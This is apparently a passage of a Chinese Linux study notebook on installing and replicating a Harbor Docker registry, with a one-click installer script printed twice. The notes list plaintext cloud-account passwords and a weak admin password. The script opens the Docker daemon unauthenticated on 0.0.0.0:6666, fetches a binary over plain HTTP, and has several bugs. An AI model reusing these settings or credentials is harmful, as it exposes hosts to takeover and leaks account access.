#安装docker harbor
[root@centos7 ~]# /apps/harbor/install.sh
[Step 4]: starting Harbor ...
Creating network "harbor_harbor" with the default driver
Creating harbor-log ... done
Creating harbor-adminserver ... done
Creating redis              ... done
Creating registry           ... done
Creating harbor-db          ... done
Creating registryctl        ... done
Creating harbor-core        ... done
Creating harbor-portal      ... done
Creating harbor-jobservice  ... done
Creating nginx              ... done

✔ ----Harbor has been installed and started successfully.----

Now you should be able to visit the admin portal at http://10.0.0.87. 
For more details, please visit https://github.com/goharbor/harbor .
```

###### 48.9.4.2.7 实现开机自动启动harbor

**方法1: 通过service文件实现**

```
[root@centos7 ~]# vim /lib/systemd/system/harbor.service
[Unit]
Description=Harbor
After=docker.service systemd-networkd.service systemd-resolved.service
Requires=docker.service
Documentation=http://github.com/vmware/harbor

[Service]
Type=simple
Restart=on-failure
RestartSec=5
ExecStart=/usr/bin/docker-compose -f /apps/harbor/docker-compose.yml up
ExecStop=/usr/bin/docker-compose -f /apps/harbor/docker-compose.yml down

[Install]
WantedBy=multi-user.target


[root@centos7 ~]# systemctl daemon-reload
[root@centos7 ~]# systemctl enable --now harbor
#[root@centos7 ~]# systemctl stop harbor
```

**方法2: 通过 rc.local实现**

```
[root@harbor ~]#cat /etc/rc.local 
#!/bin/bash
cd /apps/harbor
/usr/bin/docker-compose up 


[root@harbor ~]#chmod +x /etc/rc.local
```

###### 48.9.4.2.8 登录harbor主机网站

```
用浏览器访问: http://10.0.0.87/
用户名: admin 
密码: 123456

腾讯云账户：paranoid/admin
密码:Liu19971009/Xjy19971009
```

![1660364895280](linux体系.assets/1660364895280.png)

![1660364956168](linux体系.assets/1660364956168.png)

###### 48.9.4.2.9 一键安装Harbor脚本

```
#!/bin/bash
#
#**********************************************************************************************
#Author:        liusenbiao
#QQ:            1805336068
#Date:          2022-07-31
#FileName:      install_harbor.sh
#System:        适用版本:centos 7/8 & ubuntu 18.04/20.04
#Description:   一键安装Harbor私有仓库
#********************************************************************************************
. /etc/init.d/functions $> /dev/null
set -e
COLOR="echo -e \E[1;32m"
COLOR1="echo -e \E[1;31m"
END="\E[0m"

#ubuntu依赖包
ubuntu_page="
wget
apt-transport-https
ca-certificates
software-properties-common
python2
openssl
"
#centos依赖包
centos_page="
wget
python2
openssl
"
SRC_DIR=/usr/local/src
DOCKER_DIR=/usr/lib/systemd/system/docker.service
DOCKER_CE_URL='https://mirrors.cloud.tencent.com/docker-ce/linux/static/stable/x86_64/'
DOCKER_COMPOSE_URL=http://liusenbiao.cn/download/Docker/Docker_Compose/
DOCKER_FILE=docker-19.03.10.tgz
DOCKER_COMPOSE=docker-compose-Linux-x86_64-1.25.3
HARBOR_URL=https://storage.googleapis.com/harbor-releases/release-1.7.0/
HARBOR_VERSION=harbor-offline-installer-v1.7.6.tgz


#操作系统版本
os(){
OS_ID=`sed -rn '/^NAME=/s@.*="([[:alpha:]]+).*"$@\1@p' /etc/os-release`

}


#安装相关包依赖
install_dependencies() {
    if [[ ${OS_ID} == "CentOS" ]] &> /dev/null;then
	   if [ $ostype1 = 8 ];then
         for PAGE in ${centos_page};do
         rpm -q $PAGE &> /dev/null || yum -y install $PAGE
         done
	     ln -s /usr/bin/python2 /usr/bin/python
	   elif [ $ostype1 = 7 ];then
	     for PAGE in ${centos_page};do
         rpm -q $PAGE &> /dev/null || yum -y install $PAGE
         done
	   fi
    else
       for PAGE in ${ubuntu_page};do
       rpm -q $PAGE &> /dev/null || sudo apt -y install $PAGE
       done
	   ln -s /usr/bin/python2 /usr/bin/python
    fi

}

#检查Docker文件
check_file (){
    cd ${SRC_DIR}
    if [ ! -e ${DOCKER_FILE} ];then
        ${COLOR}"缺少${DOCKER_FILE}文件,如果是离线包,请把文件放到${SRC_DIR}目录下"${END}
        ${COLOR}'开始下载DOCKER二进制安装包'${END}
        sudo wget ${DOCKER_CE_URL}${DOCKER_FILE} || { ${COLOR1}"DOCKER二进制安装包下载失败"${END}; exit; } 
    else
        ${COLOR}"相关文件已准备好"${END}
    fi
}

#安装Docker,适用于ubuntu和centos
install_docker() {
    [ -f /usr/bin/docker ] && { ${COLOR}"DOCKER已存在，安装失败"${END};return; }
    ${COLOR}"开始安装DOCKER..."${END}
    sudo tar xf ${DOCKER_FILE} 
    sudo mv docker/* /usr/bin/
    sudo cat > /lib/systemd/system/docker.service <<-EOF
[Unit]
Description=Docker Application Container Engine
Documentation=https://docs.docker.com
After=network-online.target firewalld.service
Wants=network-online.target

[Service]
Type=notify
# the default is not to use systemd for cgroups because the delegate issues still
# exists and systemd currently does not support the cgroup feature set required
# for containers run by docker
#add label-name and reomote visit functions
ExecStart=/usr/bin/dockerd -H unix://var/run/docker.sock --label="name=docker1-liu" -H tcp://0.0.0.0:6666
ExecReload=/bin/kill -s HUP \$MAINPID
# Having non-zero Limit*s causes performance problems due to accounting overhead
# in the kernel. We recommend using cgroups to do container-local accounting.
LimitNOFILE=infinity
LimitNPROC=infinity
LimitCORE=infinity
# Uncomment TasksMax if your systemd version supports it.
# Only systemd 226 and above support this version.
#TasksMax=infinity
TimeoutStartSec=0
# set delegate yes so that systemd does not reset the cgroups of docker containers
Delegate=yes
# kill only the docker process, not all processes in the cgroup
KillMode=process
# restart the docker process if it exits prematurely
Restart=on-failure
StartLimitBurst=3
StartLimitInterval=60s

[Install]
WantedBy=multi-user.target
EOF
    sudo mkdir -p /etc/docker
    sudo tee /etc/docker/daemon.json <<-'EOF'
{
    "registry-mirrors": [
        "https://h1ea2sza.mirror.aliyuncs.com",
        "https://docker.mirrors.ustc.edu.cn",
        "http://f1361db2.m.daocloud.io",
        "https://registry.docker-cn.com",
        "https://dockerhub.azk8s.cn",
        "https://reg-mirror.qiniu.com",
        "https://hub-mirror.c.163.com",
        "https://mirror.ccs.tencentyun.com"
    ]
}
EOF
    sudo systemctl daemon-reload
    sudo systemctl enable --now docker &> /dev/null
    sudo systemctl is-active docker &> /dev/null && ${COLOR}"Docker 服务启动成功"${END} || { ${COLOR1}"Docker 启动失败"${END};exit; }
    sudo docker version && ${COLOR}"Docker 安装成功"${END} || ${COLOR1}"Docker 安装失败"${END}
}



#解决SWAP报警提示
set_swap_limit(){
    if [ ${OS_ID} == "Ubuntu" ];then
        ${COLOR}'设置Docker的"WARNING: No swap limit support"警告'${END}
       sudo sed -ri '/^GRUB_CMDLINE_LINUX=/s@"$@ swapaccount=1"@' /etc/default/grub
        update-grub &> /dev/null
        #${COLOR}"10秒后，机器会自动重启"${END}
        #sleep 10
        #reboot
    fi
}


#设置别名alias
set_centos_alias(){
    sudo cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/sysconfig/network-scripts"
alias vie0="vim /etc/sysconfig/network-scripts/ifcfg-eth0"
alias vie1="vim /etc/sysconfig/network-scripts/ifcfg-eth1"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
alias rmi="docker images -qa|xargs docker rmi -f"
alias rmc="docker ps -qa|xargs docker rm -f"
EOF
}



#设置别名alias
set_ubuntu_alias(){
    sudo cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/netplan"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
EOF
alias rmi="docker images -qa|xargs sudo docker rmi -f"
alias rmc="docker ps -qa|xargs sudo docker rm -f"
}


set_alias(){
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        set_centos_alias        
    else
        set_ubuntu_alias
    fi
}




#安装docker-compose
install_docker_compose(){
      if [ ! -e ${DOCKER_COMPOSE} ];then
	     ${COLOR}'开始下载DOCKER-COMPOSE安装包'${END}
        sudo wget ${DOCKER_COMPOSE_URL}${DOCKER_COMPOSE} || { ${COLOR1}"DOCKER-COMPOSE安装包下载失败"${END}; exit; } 
		sudo cp ${DOCKER_COMPOSE} /usr/bin/
		sudo chmod +x /usr/bin/${DOCKER_COMPOSE}
		sudo ln -s /usr/bin/${DOCKER_COMPOSE} /usr/bin/docker-compose
    elif [ -e ${DOCKER_COMPOSE} ];then
	    #离线安装包已经准备好了
        ${COLOR}"相关文件已准备好"${END}
        sudo cp ${DOCKER_COMPOSE} /usr/bin/
		sudo chmod +x /usr/bin/${DOCKER_COMPOSE}
		sudo ln -s /usr/bin/${DOCKER_COMPOSE} /usr/bin/docker-compose
    else
	   ${COLOR}"DOCKER_COMPOSE安装完成，直接进入下一步安装"${END}
	   return
    fi
}



#centos安或ubuntu安装harbor
install_harbor(){
      if [ ! -e /root/${HARBOR_VERSION} ];then
	     ${COLOR}'开始下载HARBOR二进制安装包'${END}
		 myip=`hostname -I | awk '{print $1}'`
         sudo wget ${HARBOR_URL}${HARBOR_VERSION} || { ${COLOR1}"HARBOR离线安装包下载失败"${END}; exit; } 
         [ -d /apps ] || mkdir /apps/
		 sudo tar xvf ${HARBOR_VERSION} -C /apps/
		 sudo sed -i.bak "s#reg.mydomain.com#${myip}#" /apps/harbor/harbor.cfg
		 sudo sed -i.bak 's/harbor_admin_password = Harbor12345/harbor_admin_password = 123456/' /apps/harbor/harbor.cfg
    else
        ${COLOR}"相关文件已准备好"${END}
		 [ -d /apps ] || mkdir /apps/
		 sudo tar xvf ${HARBOR_VERSION} -C /apps/
		 sudo sed -i "s#reg.mydomain.com#${myip}#" /apps/harbor/harbor.cfg
		 sudo sed -i.bak 's/harbor_admin_password = Harbor12345/harbor_admin_password = 123456/' /apps/harbor/harbor.cfg
    fi
	
	
    #配置服务文件
     sudo cat > /lib/systemd/system/harbor.service <<-EOF
[Unit]
Description=Harbor
After=docker.service systemd-networkd.service systemd-resolved.service
Requires=docker.service
Documentation=http://github.com/vmware/harbor

[Service]
Type=simple
Restart=on-failure
RestartSec=5
ExecStart=/usr/bin/docker-compose -f /apps/harbor/docker-compose.yml up
ExecStop=/usr/bin/docker-compose -f /apps/harbor/docker-compose.yml down

[Install]
WantedBy=multi-user.target
EOF

/apps/harbor/install.sh && ${COLOR}"harbor安装成功"$END || ${COLOR1}"harbor安装失败"$END
sudo systemctl daemon-reload
sudo systemctl enable --now harbor

}

#系统类型
ostype1=`awk -F'"' '/^VERSION_ID/{print $2}' /etc/os-release` 
ostype2=`awk -F'"' '/^NAME/{print $2}' /etc/os-release`

Docker_complete() {

if [[ $ostype2 == "CentOS Linux" ]];then
    if [ $ostype1 = 8 ];then
        docker --version &> /dev/null && action "Docker已安装" || action "亲亲~Docker还未安装哦"
        ${COLOR}"亲亲~奴家正在安装Docker中"${END}
        install_dependencies && check_file && install_docker && set_alias || { ${COLOR1}"DOCKE二进制安装包下载失败"${END}; exit; }
    elif [ $ostype1 = 7 ];then
        docker --version &> /dev/null && action "Docker已安装" || action "亲亲~Docker还未安装哦"
        ${COLOR}"亲亲~奴家正在安装Docker中"${END}
        install_dependencies && check_file && install_docker && set_alias || { ${COLOR1}"DOCKE二进制安装包下载失败"${END}; exit; }
    fi
elif [[ $ostype2 == "Ubuntu" ]];then
        sudo docker --version &> /dev/null && ${COLOR}"Docker已安装"$END || ${COLOR} "亲亲~Docker还未安装哦"$END
        ${COLOR}"亲亲~奴家正在安装Docker中"${END}
        install_dependencies && check_file && install_docker && set_alias && set_swap_limit || { ${COLOR1}"DOCKE二进制安装包下载失败"${END}; exit; }
fi

}



#判断compose是否安装
Docker_compose_complete() {

docker-compose --version &&> /dev/null && ${COLOR}"亲亲~Docker Compose已安装"${END} || ${COLOR1}"亲亲~Docker Compose还未安装哦"${END}
${COLOR}"亲亲~奴家正在安装Docker_compose_中"${END}
install_docker_compose && ${COLOR}"DOCKER_COMPOSE安装成功"

}



#harbor安装判断
Harbor__complete() {
if [[ $ostype2 == "Ubuntu" ]];then
    if [ -e /lib/systemd/system/harbar.service ];then 
        ${COLOR}"harbor已安装"${END};exit
        else 
        install_harbor && ${COLOR}"harbor安装完成,已开机启动!"${END} || { ${COLOR1}"harbor安装失败"${END}; exit; }
        ${COLOR}"10秒后，机器会自动重启"${END}
        sleep 10
        reboot
    fi
elif [[ $ostype2 == "CentOS Linux" ]];then
    if [ -e /lib/systemd/system/harbar.service ];then
        ${COLOR}"harbor已安装"${END};exit
    else
        install_harbor && ${COLOR}"harbor安装完成,已开机启动!"${END} || { ${COLOR1}"harbor安装失败"${END}; exit; }	
    fi
fi

}


main(){
    os
    Docker_complete
	Docker_compose_complete
	Harbor__complete
}

main
```

**centos7测试成功**

![1660443795702](linux体系.assets/1660443795702.png)

**centos8测试成功**

![1660447681603](linux体系.assets/1660447681603.png)

**ubuntu测试成功**

![1660447848461](linux体系.assets/1660447848461.png)

![1660447878587](linux体系.assets/1660447878587.png)

![1660448493285](linux体系.assets/1660448493285.png)

##### 48.9.4.3 使用单主机harbor

###### 48.9.4.3.1 建立项目

**harbor上必须先建立项目，才能上传镜像**

![1660465863824](linux体系.assets/1660465863824.png)

![1660465985369](linux体系.assets/1660465985369.png)

![1660466053766](linux体系.assets/1660466053766.png)

###### 48.9.4.3.2 命令行登录harbor

```
#配置允许https登录
#10.0.0.77和10.0.0.87是未来要登陆的两个harbor仓库的地址
[root@centos8 ~]# vim /lib/systemd/system/docker.service
ExecStart=/usr/bin/dockerd -H unix://var/run/docker.sock --label="name=docker1-liu" -H tcp://0.0.0.0:6666 --insecure-registry 10.0.0.77 --insecure-registry 10.0.0.87/www.liusenbiao.com


[root@centos8 ~]# systemctl daemon-reload
[root@centos8 ~]# systemctl restart docker
[root@centos8 ~]# docker login 10.0.0.87
Username: admin
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded



#自动生成密钥，下次直接登录
[root@centos8 ~]# cat .docker/config.json
{
	"auths": {
		"10.0.0.87": {
			"auth": "YWRtaW46MTIzNDU2"
		}
	},
	"HttpHeaders": {
		"User-Agent": "Docker-Client/19.03.10 (linux)"
	}

```

###### 48.9.4.3.3 给本地镜像打标签并上传到harbor

**修改 images 的名称，不修改成指定格式无法将镜像上传到 harbor仓库**

格式为: 

```

```

**栗子：**

```
#查看本地镜像
[root@centos8 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
centos7-base        v1                  4ceb0de32ae2        4 minutes ago       504MB
centos              centos7.7.1908      08d05d1d5859        2 years ago         204MB


#推送镜像
[root@centos8 ~]# docker tag 4ceb0de32ae2 10.0.0.87/liu/centos7-base:v1.0
[root@centos8 ~]# docker push 10.0.0.87/liu/centos7-base:v1.0
The push refers to repository [10.0.0.87/liu/centos7-base]
5ef3acfe4bb8: Pushed 
497a6cea49dc: Pushed 
3497991a3618: Pushed 
034f282942cd: Pushed 
v1.0: digest: sha256:441ed2ca07cba789c813c26f3588021ab9471f74999066b31fd764c473a02179 size: 1156



#拉取镜像
[root@redis ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE


[root@client2 ~]# docker pull 10.0.0.87/liu/centos7-base:v1.0
v1.0: Pulling from liu/centos7-base
f34b00c7da20: Pull complete 
be696f5f54e3: Pull complete 
bed186de3ae6: Pull complete 
5ccc02a5d4a5: Pull complete 
Digest: sha256:441ed2ca07cba789c813c26f3588021ab9471f74999066b31fd764c473a02179
Status: Downloaded newer image for 10.0.0.87/liu/centos7-base:v1.0
10.0.0.87/liu/centos7-base:v1.0



[root@client2 ~]# docker images
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
10.0.0.87/liu/centos7-base   v1.0                4ceb0de32ae2        25 minutes ago      504MB
```

**推送镜像**

![1660473938608](linux体系.assets/1660473938608.png)

**拉取镜像**

![1660473975006](linux体系.assets/1660474000846.png)

###### 48.9.4.3.4 创建自动打标签上传镜像脚本

```
#在10.0.0.100上修改以前的build.sh脚本
[root@ubuntu1804 1.16.1-alpine]#vim build.sh
[root@ubuntu1804 1.16.1-alpine]#cat build.sh 
#!/bin/bash
docker build -t $1 .
docker tag $1 10.0.0.87/liu/$1
docker push 10.0.0.87/liu/$1


[root@ubuntu1804 1.16.1-alpine]#bash build.sh v2
```

![1660476727403](linux体系.assets/1660476727403.png)

###### 48.9.4.3.5 修改harbor配置

```
#后期如果修改harbor配置，比如: 修改IP地址等，可执行以下步骤生效
[root@ubuntu1804 ~]#cd /apps/harbor/
[root@ubuntu1804 harbor]#docker-compose stop
Stopping nginx              ... done
Stopping harbor-portal      ... done
Stopping harbor-jobservice  ... done
Stopping harbor-core        ... done
Stopping harbor-adminserver ... done




#修改harbor配置
[root@ubuntu1804 harbor]#vim harbor.cfg


#更新配置
[root@ubuntu1804 ~]#/apps/harbor/prepare 
Clearing the configuration file: /apps/harbor/common/config/db/env
Clearing the configuration file: /apps/harbor/common/config/core/private_key.pem
Clearing the configuration file: /apps/harbor/common/config/core/env
Clearing the configuration file: /apps/harbor/common/config/core/app.conf
Clearing the configuration file: /apps/harbor/common/config/adminserver/env


#重新启动docker compose
[root@ubuntu1804 harbor]#docker-compose start
Starting log         ... done
Starting postgresql  ... done
Starting redis       ... done
```

##### 48.9.4.4  实现harbor高可用(重点)

![1660478806039](linux体系.assets/1660478806039.png)

```
Harbor支持基于策略的Docker镜像复制功能，这类似于MySQL的主从同步，其可以实现不同的数据中心、不同的运行环境之间同步镜像，并提供友好的管理界面，大大简化了实际运维中的镜像管理工作，已经有用很多互联网公司使用harbor搭建内网docker仓库的案例，并且还有实现了双向复制功能。
```

###### 48.9.4.4.1 安装二台harbor主机

```
用一键安装harbor脚本在两台机器上安装harbor
```

**第一台harbor主机**

```
在这个harbor主机新建项目并上传镜像，准备于第二台harbor主机进行同步！！
```

![1660483526756](linux体系.assets/1660483526756.png)

![1660483718047](linux体系.assets/1660483718047.png)

**第二台harbor主机**

![1660483567420](linux体系.assets/1660483567420.png)

###### 48.9.4.4.2 第一台harbor上仓库管理中新建目标

![1660483810364](linux体系.assets/1660483810364.png)

![1660484055788](linux体系.assets/1660484055788.png)

![1660484261816](linux体系.assets/1660484261816.png)

###### 48.9.4.4.3 第一台harbor上新建复制规则

![1660484604412](linux体系.assets/1660484604412.png)

![1660484677722](linux体系.assets/1660484677722.png)

![1660484715431](linux体系.assets/1660484715431.png)

**第二台harbor机器复制成功**

![1660484803553](linux体系.assets/1660484803553.png)

###### 48.9.4.4.4 实现双高同步

![1660485377704](linux体系.assets/1660485377704.png)

![1660485508228](linux体系.assets/1660485508228.png)

![1660485605198](linux体系.assets/1660485605198.png)

**第二台Harbor删除镜像作为测试**

![1660485660356](linux体系.assets/1660485660356.png)



**第一台Harbor同步成功！！**

![1660485711867](linux体系.assets/1660485711867.png)

##### 48.9.4.5 harbor安全https配置(熟悉)

harbor默认使用http,为了安全，可以使用https

###### 48.9.4.5.1 实现Harbor的https认证

```
#运行一键安装harbor脚本
[root@centos7 ~]#bash install_harbor.sh
[root@centos7 ~]#cat install_harbor.sh
#!/bin/bash
#
#**********************************************************************************************
#Author:        liusenbiao
#QQ:            1805336068
#Date:          2022-07-31
#FileName:      install_harbor.sh
#System:        适用版本:centos 7/8 & ubuntu 18.04/20.04
#Description:   一键安装Harbor私有仓库
#********************************************************************************************
. /etc/init.d/functions $> /dev/null
set -e
COLOR="echo -e \E[1;32m"
COLOR1="echo -e \E[1;31m"
END="\E[0m"

#ubuntu依赖包
ubuntu_page="
wget
apt-transport-https
ca-certificates
software-properties-common
python2
openssl
"
#centos依赖包
centos_page="
wget
python2
openssl
"
SRC_DIR=/usr/local/src
DOCKER_DIR=/usr/lib/systemd/system/docker.service
DOCKER_CE_URL='https://mirrors.cloud.tencent.com/docker-ce/linux/static/stable/x86_64/'
DOCKER_COMPOSE_URL=http://liusenbiao.cn/download/Docker/Docker_Compose/
DOCKER_FILE=docker-19.03.10.tgz
DOCKER_COMPOSE=docker-compose-Linux-x86_64-1.25.3
HARBOR_URL=https://storage.googleapis.com/harbor-releases/release-1.7.0/
HARBOR_VERSION=harbor-offline-installer-v1.7.6.tgz


#操作系统版本
os(){
OS_ID=`sed -rn '/^NAME=/s@.*="([[:alpha:]]+).*"$@\1@p' /etc/os-release`

}


#安装相关包依赖
install_dependencies() {
    if [[ ${OS_ID} == "CentOS" ]] &> /dev/null;then
	   if [ $ostype1 = 8 ];then
         for PAGE in ${centos_page};do
         rpm -q $PAGE &> /dev/null || yum -y install $PAGE
         done
	     ln -s /usr/bin/python2 /usr/bin/python
	   elif [ $ostype1 = 7 ];then
	     for PAGE in ${centos_page};do
         rpm -q $PAGE &> /dev/null || yum -y install $PAGE
         done
	   fi
    else
       for PAGE in ${ubuntu_page};do
       rpm -q $PAGE &> /dev/null || sudo apt -y install $PAGE
       done
	   ln -s /usr/bin/python2 /usr/bin/python
    fi

}

#检查Docker文件
check_file (){
    cd ${SRC_DIR}
    if [ ! -e ${DOCKER_FILE} ];then
        ${COLOR}"缺少${DOCKER_FILE}文件,如果是离线包,请把文件放到${SRC_DIR}目录下"${END}
        ${COLOR}'开始下载DOCKER二进制安装包'${END}
        sudo wget ${DOCKER_CE_URL}${DOCKER_FILE} || { ${COLOR1}"DOCKER二进制安装包下载失败"${END}; exit; } 
    else
        ${COLOR}"相关文件已准备好"${END}
    fi
}

#安装Docker,适用于ubuntu和centos
install_docker() {
    [ -f /usr/bin/docker ] && { ${COLOR}"DOCKER已存在，安装失败"${END};return; }
    ${COLOR}"开始安装DOCKER..."${END}
    sudo tar xf ${DOCKER_FILE} 
    sudo mv docker/* /usr/bin/
    sudo cat > /lib/systemd/system/docker.service <<-EOF
[Unit]
Description=Docker Application Container Engine
Documentation=https://docs.docker.com
After=network-online.target firewalld.service
Wants=network-online.target

[Service]
Type=notify
# the default is not to use systemd for cgroups because the delegate issues still
# exists and systemd currently does not support the cgroup feature set required
# for containers run by docker
#add label-name and reomote visit functions
ExecStart=/usr/bin/dockerd -H unix://var/run/docker.sock --label="name=docker1-liu" -H tcp://0.0.0.0:6666
ExecReload=/bin/kill -s HUP \$MAINPID
# Having non-zero Limit*s causes performance problems due to accounting overhead
# in the kernel. We recommend using cgroups to do container-local accounting.
LimitNOFILE=infinity
LimitNPROC=infinity
LimitCORE=infinity
# Uncomment TasksMax if your systemd version supports it.
# Only systemd 226 and above support this version.
#TasksMax=infinity
TimeoutStartSec=0
# set delegate yes so that systemd does not reset the cgroups of docker containers
Delegate=yes
# kill only the docker process, not all processes in the cgroup
KillMode=process
# restart the docker process if it exits prematurely
Restart=on-failure
StartLimitBurst=3
StartLimitInterval=60s

[Install]
WantedBy=multi-user.target
EOF
    sudo mkdir -p /etc/docker
    sudo tee /etc/docker/daemon.json <<-'EOF'
{
    "registry-mirrors": [
        "https://h1ea2sza.mirror.aliyuncs.com",
        "https://docker.mirrors.ustc.edu.cn",
        "http://f1361db2.m.daocloud.io",
        "https://registry.docker-cn.com",
        "https://dockerhub.azk8s.cn",
        "https://reg-mirror.qiniu.com",
        "https://hub-mirror.c.163.com",
        "https://mirror.ccs.tencentyun.com"
    ]
}
EOF
    sudo systemctl daemon-reload
    sudo systemctl enable --now docker &> /dev/null
    sudo systemctl is-active docker &> /dev/null && ${COLOR}"Docker 服务启动成功"${END} || { ${COLOR1}"Docker 启动失败"${END};exit; }
    sudo docker version && ${COLOR}"Docker 安装成功"${END} || ${COLOR1}"Docker 安装失败"${END}
}



#解决SWAP报警提示
set_swap_limit(){
    if [ ${OS_ID} == "Ubuntu" ];then
        ${COLOR}'设置Docker的"WARNING: No swap limit support"警告'${END}
       sudo sed -ri '/^GRUB_CMDLINE_LINUX=/s@"$@ swapaccount=1"@' /etc/default/grub
        update-grub &> /dev/null
        #${COLOR}"10秒后，机器会自动重启"${END}
        #sleep 10
        #reboot
    fi
}


#设置别名alias
set_centos_alias(){
    sudo cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/sysconfig/network-scripts"
alias vie0="vim /etc/sysconfig/network-scripts/ifcfg-eth0"
alias vie1="vim /etc/sysconfig/network-scripts/ifcfg-eth1"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
alias rmi="docker images -qa|xargs docker rmi -f"
alias rmc="docker ps -qa|xargs docker rm -f"
EOF
}



#设置别名alias
set_ubuntu_alias(){
    sudo cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/netplan"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
EOF
alias rmi="docker images -qa|xargs sudo docker rmi -f"
alias rmc="docker ps -qa|xargs sudo docker rm -f"
}


set_alias(){
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        set_centos_alias        
    else
        set_ubuntu_alias
    fi
}




#安装docker-compose
install_docker_compose(){
      if [ ! -e ${DOCKER_COMPOSE} ];then
	     ${COLOR}'开始下载DOCKER-COMPOSE安装包'${END}
        sudo wget ${DOCKER_COMPOSE_URL}${DOCKER_COMPOSE} || { ${COLOR1}"DOCKER-COMPOSE安装包下载失败"${END}; exit; } 
		sudo cp ${DOCKER_COMPOSE} /usr/bin/
		sudo chmod +x /usr/bin/${DOCKER_COMPOSE}
		sudo ln -s /usr/bin/${DOCKER_COMPOSE} /usr/bin/docker-compose
    elif [ -e ${DOCKER_COMPOSE} ];then
	    #离线安装包已经准备好了
        ${COLOR}"相关文件已准备好"${END}
        sudo cp ${DOCKER_COMPOSE} /usr/bin/
		sudo chmod +x /usr/bin/${DOCKER_COMPOSE}
		sudo ln -s /usr/bin/${DOCKER_COMPOSE} /usr/bin/docker-compose
    else
	   ${COLOR}"DOCKER_COMPOSE安装完成，直接进入下一步安装"${END}
	   return
    fi
}



#centos安或ubuntu安装harbor
install_harbor(){
      if [ ! -e /root/${HARBOR_VERSION} ];then
	     ${COLOR}'开始下载HARBOR二进制安装包'${END}
		 myip=`hostname -I | awk '{print $1}'`
         sudo wget ${HARBOR_URL}${HARBOR_VERSION} || { ${COLOR1}"HARBOR离线安装包下载失败"${END}; exit; } 
         [ -d /apps ] || mkdir /apps/
		 sudo tar xvf ${HARBOR_VERSION} -C /apps/
		 sudo sed -i.bak "s#reg.mydomain.com#${myip}#" /apps/harbor/harbor.cfg
		 sudo sed -i.bak 's/harbor_admin_password = Harbor12345/harbor_admin_password = 123456/' /apps/harbor/harbor.cfg
    else
        ${COLOR}"相关文件已准备好"${END}
		 [ -d /apps ] || mkdir /apps/
		 sudo tar xvf ${HARBOR_VERSION} -C /apps/
		 sudo sed -i "s#reg.mydomain.com#${myip}#" /apps/harbor/harbor.cfg
		 sudo sed -i.bak 's/harbor_admin_password = Harbor12345/harbor_admin_password = 123456/' /apps/harbor/harbor.cfg
    fi
	
	
    #配置服务文件
     sudo cat > /lib/systemd/system/harbor.service <<-EOF
[Unit]
Description=Harbor
After=docker.service systemd-networkd.service systemd-resolved.service
Requires=docker.service
Documentation=http://github.com/vmware/harbor

[Service]
Type=simple
Restart=on-failure
RestartSec=5
ExecStart=/usr/bin/docker-compose -f /apps/harbor/docker-compose.yml up
ExecStop=/usr/bin/docker-compose -f /apps/harbor/docker-compose.yml down

[Install]
WantedBy=multi-user.target
EOF

/apps/harbor/install.sh && ${COLOR}"harbor安装成功"$END || ${COLOR1}"harbor安装失败"$END
sudo systemctl daemon-reload
sudo systemctl enable --now harbor

}

#系统类型
ostype1=`awk -F'"' '/^VERSION_ID/{print $2}' /etc/os-release` 
ostype2=`awk -F'"' '/^NAME/{print $2}' /etc/os-release`

Docker_complete() {

if [[ $ostype2 == "CentOS Linux" ]];then
    if [ $ostype1 = 8 ];then
        docker --version &> /dev/null && action "Docker已安装" || action "亲亲~Docker还未安装哦"
        ${COLOR}"亲亲~奴家正在安装Docker中"${END}
        install_dependencies && check_file && install_docker && set_alias || { ${COLOR1}"DOCKE二进制安装包下载失败"${END}; exit; }
    elif [ $ostype1 = 7 ];then
        docker --version &> /dev/null && action "Docker已安装" || action "亲亲~Docker还未安装哦"
        ${COLOR}"亲亲~奴家正在安装Docker中"${END}
        install_dependencies && check_file && install_docker && set_alias || { ${COLOR1}"DOCKE二进制安装包下载失败"${END}; exit; }
    fi
elif [[ $ostype2 == "Ubuntu" ]];then
        sudo docker --version &> /dev/null && ${COLOR}"Docker已安装"$END || ${COLOR} "亲亲~Docker还未安装哦"$END
        ${COLOR}"亲亲~奴家正在安装Docker中"${END}
        install_dependencies && check_file && install_docker && set_alias && set_swap_limit || { ${COLOR1}"DOCKE二进制安装包下载失败"${END}; exit; }
fi

}



#判断compose是否安装
Docker_compose_complete() {

docker-compose --version &&> /dev/null && ${COLOR}"亲亲~Docker Compose已安装"${END} || ${COLOR1}"亲亲~Docker Compose还未安装哦"${END}
${COLOR}"亲亲~奴家正在安装Docker_compose_中"${END}
install_docker_compose && ${COLOR}"DOCKER_COMPOSE安装成功"

}



#harbor安装判断
Harbor__complete() {
if [[ $ostype2 == "Ubuntu" ]];then
    if [ -e /lib/systemd/system/harbar.service ];then 
        ${COLOR}"harbor已安装"${END};exit
        else 
        install_harbor && ${COLOR}"harbor安装完成,已开机启动!"${END} || { ${COLOR1}"harbor安装失败"${END}; exit; }
        ${COLOR}"10秒后，机器会自动重启"${END}
        sleep 10
        reboot
    fi
elif [[ $ostype2 == "CentOS Linux" ]];then
    if [ -e /lib/systemd/system/harbar.service ];then
        ${COLOR}"harbor已安装"${END};exit
    else
        install_harbor && ${COLOR}"harbor安装完成,已开机启动!"${END} || { ${COLOR1}"harbor安装失败"${END}; exit; }	
    fi
fi

}


main(){
    os
    Docker_complete
	Docker_compose_complete
	Harbor__complete
}

main





#生成私钥和证书
